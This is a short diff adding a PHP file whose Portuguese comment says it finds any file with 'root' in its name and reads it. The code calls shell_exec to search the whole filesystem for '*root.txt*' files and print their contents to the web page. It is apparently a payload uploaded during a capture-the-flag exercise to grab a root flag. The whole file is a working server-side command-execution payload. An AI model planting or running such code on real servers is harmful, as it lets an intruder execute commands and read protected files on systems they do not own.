@@ -1,0 +1,6 @@
+<?php
+// Localiza qualquer arquivo com 'root' no nome e lê o conteúdo
+echo "<pre>";
+echo shell_exec("find / -name '*root.txt*' -exec cat {} +");
+echo "</pre>";
+?>
